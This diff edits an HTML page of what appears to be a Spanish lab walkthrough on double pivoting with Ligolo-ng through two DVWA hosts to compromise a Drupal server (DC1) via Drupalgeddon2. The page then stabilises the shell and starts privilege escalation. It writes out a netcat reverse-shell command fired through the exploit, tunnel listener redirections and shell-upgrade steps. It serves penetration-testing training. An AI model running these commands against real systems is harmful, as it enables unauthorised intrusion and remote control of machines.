@@ -11,7 +11,7 @@
         <div class="dropdown">
             <button class="dropbtn">Índice</button>
             <div class="dropdown-content">
-                <a href="#section-1">Objetivo</a><a href="#section-2">Confirguración y comprobación inicial</a><a href="#section-3">Caso práctico</a><a href="#section-4">Shell reversa y establecimiento de Ligolo-ng</a><a href="#section-5">Local Port-Forwarding con Ligolo</a><a href="#section-6">Pivotando hacia DVWA 2</a><a href="#section-7">Acceso y explotación a DC1</a><a href="#section-8">Escalada de priviledios DC1</a>
+                <a href="#section-1">Objetivo</a><a href="#section-2">Confirguración y comprobación inicial</a><a href="#section-3">Caso práctico</a><a href="#section-4">Shell reversa y establecimiento de Ligolo-ng</a><a href="#section-5">Local Port-Forwarding con Ligolo</a><a href="#section-6">Pivotando hacia DVWA 2</a><a href="#section-7">Acceso y explotación a DC1</a><a href="#section-8">Estabilización y escalada de privilegios </a>
             </div>
         </div>
     </nav>
@@ -538,79 +538,26 @@
     </div>
     
                     
-                    <h3>Redirección doble desde DVWA </h3>
-                    
-                    <p>Para hacer un doble pivot con Ligolo-ng, necesitaremos crear una segunda interfaz tun como la primera. Puedes llamarla como quieras. Nosotros la llamamos cha-2.</p>
-                    
-                    
-                    
-                    <h3></h3>
-                    
-                    
-                    
-                    
-    <div class="image-container align-center" style="max-width: 60%">
-        <img src="img/20241215_203755_2024-12-15_21-37.png" 
-             alt=""
-             style="width: 100%">
-        
-    </div>
-    
-                    
-                    <h3></h3>
-                    
-                    <p>El siguiente paso es agregar un listener en el puerto 11601 a la sesión existente de Ligolo-ng y redirigirlo a nuestra máquina.</p>
-                    
-                    
-                    
-                    <h3></h3>
-                    <div class="code-block"><code>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp</code></div>
-                    
-                    
-                    
-                    
-                    <h3></h3>
-                    
-                    
-                    
-                    
-    <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_204025_2024-12-15_21-40.png" 
-             alt="Como resultado, podemos usar el agente en la máquina DVWA para conectarnos nuevamente a Ligolo-ng y establecer una nueva sesión, esta vez en la máquina DVWA 2, lo que nos permitirá acceder a la red 192.168.20.0/24"
-             style="width: 100%">
-        <div class="image-caption">Como resultado, podemos usar el agente en la máquina DVWA para conectarnos nuevamente a Ligolo-ng y establecer una nueva sesión, esta vez en la máquina DVWA 2, lo que nos permitirá acceder a la red 192.168.20.0/24</div>
-    </div>
-    
-                    
                     <h3>Conexión desde DVWA 2</h3>
                     
-                    <p>Necesitamos el agente en DVWA 2 así que volvemos a su interfaz en 192.168.15.20 puerto 80 para inyectar los comandos que necesitamos</p>
+                    <p>Necesitamos el agente en DVWA 2 así que volvemos a su interfaz en 192.168.15.20 puerto 80 para crear la shell reversa</p>
                     
                     
                     
                     <h3></h3>
+                    
+                    <p>Antes de crear la shell debemos indicar en la sesión que tenemos con DVWA que todo lo que sea recibido por el puerto 11601 de cualquier ip sea redireccionado de forma local en nuestra kali al puerto 4444</p>
+                    
+                    
                     
                     
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_210343_Peek_2024-12-15_22-03.gif" 
-             alt="Descargamos el agente desde DVWA a DVWA 2"
+        <img src="img/20250104_124719_2025-01-04_13-47.png" 
+             alt="Creamos la redirección de puertos"
              style="width: 100%">
-        <div class="image-caption">Descargamos el agente desde DVWA a DVWA 2</div>
-    </div>
-    
-                    
-                    <h3></h3>
-                    
-                    
-                    
-                    
-    <div class="image-container align-center" style="max-width: 60%">
-        <img src="img/20241215_210512_2024-12-15_22-04.png" 
-             alt="Damos los permisos de ejecución necesarios"
-             style="width: 100%">
-        <div class="image-caption">Damos los permisos de ejecución necesarios</div>
+        <div class="image-caption">Creamos la redirección de puertos</div>
     </div>
     
                     
@@ -620,37 +567,31 @@
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_210924_Peek_2024-12-15_22-09.gif" 
-             alt="Ejecutamos la conexion hacia el agente DVWA que a su vez será redireccionadio hacia la conexión en kali"
+        <img src="img/20250104_125035_Peek_2025-01-04_13-50.gif" 
+             alt="Iniciamos la escucha en el puerto 4444 e inyectamos el payload de shell reversa en DVWA 2 teniendo en cuenta que debe apuntar a DVWA en el puerto donde ligolo está escuchando, 11601"
              style="width: 100%">
-        <div class="image-caption">Ejecutamos la conexion hacia el agente DVWA que a su vez será redireccionadio hacia la conexión en kali</div>
+        <div class="image-caption">Iniciamos la escucha en el puerto 4444 e inyectamos el payload de shell reversa en DVWA 2 teniendo en cuenta que debe apuntar a DVWA en el puerto donde ligolo está escuchando, 11601</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20250104_125654_Peek_2025-01-04_13-56.gif" 
+             alt="Ahora necesitamos transferir el agente desde DVWA 1 a DVWA 2. Una vez hecho, antes de conectar el agente es necesario cerrar la redirección de puertos en kali y crear una nueva como se ve en la imagen"
+             style="width: 100%">
+        <div class="image-caption">Ahora necesitamos transferir el agente desde DVWA 1 a DVWA 2. Una vez hecho, antes de conectar el agente es necesario cerrar la redirección de puertos en kali y crear una nueva como se ve en la imagen</div>
     </div>
     
                     
                     <h3>Establecer el tunel hacia DVWA 2</h3>
                     
-                    <p>Nuestro paso final es cambiar nuestra sesión al segundo punto de pivote (DVWA 2), iniciar el túnel y luego agregar una ruta a la nueva red 192.168.20.0/24.</p>
+                    <p>Una vez tenemos la session necesitamos crear una nueva interfaz para poder asignar el rango de IP entre DVWA 2 y DC1, para posteriormente asignar el rango de ip y así tener visible DC1.<br><br></p>
                     
                     
-                    
-                    <h3></h3>
-                    <div class="code-block"><code>sudo ip route add 192.168.20.0/24 dev cha-2</code></div>
-                    
-                    
-                    
-                    
-                    <h3></h3>
-                    
-                    
-                    
-                    
-    <div class="image-container align-center" style="max-width: 85%">
-        <img src="img/20241215_214026_2024-12-15_22-40.png" 
-             alt=""
-             style="width: 100%">
-        
-    </div>
-    
                     
                     <h3></h3>
                     
@@ -658,10 +599,10 @@
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_211625_2024-12-15_22-16.png" 
-             alt="Iniciamos el tunel hacia DVWA 2"
+        <img src="img/20250104_130238_2025-01-04_14-02.png" 
+             alt="Seleccionamos la sesion, creamos la interfaz, asignamos el rango de IP e iniciamos el tunel"
              style="width: 100%">
-        <div class="image-caption">Iniciamos el tunel hacia DVWA 2</div>
+        <div class="image-caption">Seleccionamos la sesion, creamos la interfaz, asignamos el rango de IP e iniciamos el tunel</div>
     </div>
     
                     
@@ -694,16 +635,34 @@
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_214327_Peek_2024-12-15_22-42.gif" 
-             alt="Vemos dos hosts DVWA 2 y DC1"
+        <img src="img/20250104_130539_Peek_2025-01-04_14-05.gif" 
+             alt="Vemos dos hosts DVWA 2 (192.168.20.10) y DC1 (192.168.20.20)"
              style="width: 100%">
-        <div class="image-caption">Vemos dos hosts DVWA 2 y DC1</div>
+        <div class="image-caption">Vemos dos hosts DVWA 2 (192.168.20.10) y DC1 (192.168.20.20)</div>
     </div>
     
                     
-                    <h3>Explotación </h3>
+                    <h3>Explotación DC1</h3>
                     
-                    <p>Tenemos el camino y vemos al objetivo, vamos a explotarlo.<br><br>Como ya sabemos DC1 cuenta con un servicio web Drupal que es vulnerable por lo que vamos a buscarlo en metasploit.</p>
+                    <p>Tenemos el camino y vemos al objetivo, vamos a explotarlo.<br><br>Como ya sabemos DC1 cuenta con un servicio web Drupal que es vulnerable por lo que tras buscar por internet encontramos un PoC que nos puede servir.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    <a href="https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py" target="_blank">PoC Github</a>
+                    
+                    
+                    <h3></h3>
+                    
+                    <p>Ahora que tenemos el payload vamos de nuevo a nuestra sesion con DVWA 2 en ligolo para crear una redirección igual que hicimos antes, todo lo que venga del puerto 11601 que lo redireccione al 9001 en local.</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:9001 --tcp </code></div>
+                    
                     
                     
                     
@@ -713,7 +672,7 @@
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_215949_Peek_2024-12-15_22-59.gif" 
+        <img src="img/20250104_131556_2025-01-04_14-15.png" 
              alt=""
              style="width: 100%">
         
@@ -722,12 +681,12 @@
                     
                     <h3></h3>
                     
-                    <p>Indicamos que la shell vaya hacia la ip de DVWA 2 a través del puerto 11601 y esta viajará a traves del tunel que hemos creado pivotando 2 veces sobre dos máquinas diferentes.<br><br>A tener en cuenta es que si intentamos escuchar directamente sobre el puerto 11601 desde nuestra kali dirá que está ocupado por lo que debemos antes asignar esa misma dirección de esucha a otro puerto de nuestra máquina como el 4444</p>
+                    <p>Con esto listo vamos a explotar DC1 para ganar acceso. <br><br>En los parámetros de druppalgeddon indicamos como objetivo la IP de DC1 y como esucha la IP que corresponde a DVWA 2 dentro de la red compartida con DC1 y el puerto 11601 ya que es donde tenemos el tunel con ligolo.</p>
                     
                     
                     
                     <h3></h3>
-                    <div class="code-block"><code>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:4444 --tcp </code></div>
+                    <div class="code-block"><code>python3 druppalgeddon2.py -h http://192.168.20.20 -c 'nohup nc -e /bin/bash 192.168.20.10 11601 &'</code></div>
                     
                     
                     
@@ -738,7 +697,7 @@
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_220441_2024-12-15_23-04.png" 
+        <img src="img/20250104_132007_Peek_2025-01-04_14-19.gif" 
              alt=""
              style="width: 100%">
         
@@ -752,9 +711,21 @@
         <div class="guide-section" id="section-8">
             <div class="tool-card">
                 <div class="tool-header">
-                    <h2 class="tool-name">Escalada de priviledios DC1</h2>
+                    <h2 class="tool-name">Estabilización y escalada de privilegios </h2>
                 </div>
                 <div class="tool-content">
+                    
+                    <h3></h3>
+                    
+                    <p>Una vez tengamos acceso a DC1 es momento de estabilizar nuestra linea de comandos para que sea más estable y nos permita realizar más acciones.<br><br>Para esto vamos a usar el siguiente proceso</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>python -c 'import pty; pty.spawn('/bin/bash')'<br><br>export TERM=xterm<br><br>Pulsamos CTRL + Z<br><br>En kali : stty raw -echo; fg<br><br>Enter y luego enter de nuevo</code></div>
+                    
+                    
+                    
                     
                     <h3></h3>
                     
@@ -762,7 +733,26 @@
                     
                     
     <div class="image-container align-center" style="max-width: 100%">
-        <img src="img/20241215_231331_Peek_2024-12-16_00-13.gif" 
+        <img src="img/20250104_133005_Peek_2025-01-04_14-28.gif" 
+             alt="Ya tenemos la shell estabilizada y la primera flag"
+             style="width: 100%">
+        <div class="image-caption">Ya tenemos la shell estabilizada y la primera flag</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    
+                    <p>Ahora vamos a escalar los privilegios. Como es una maquina que ya cuenta con muchas guias vamos a abreviar un poco.<br><br>Si ejecutamos algun programa como linpeas para obtener que privilegios y otros datos tenemos con el usuario www-data encontramos que el usuario puede ejecutar el binario find como administrador por lo que teniendo esto en cuenta vamos a hacer lo siguiente</p>
+                    
+                    
+                    
+                    <h3></h3>
+                    
+                    
+                    
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20250104_134114_Peek_2025-01-04_14-41.gif" 
              alt=""
              style="width: 100%">
         
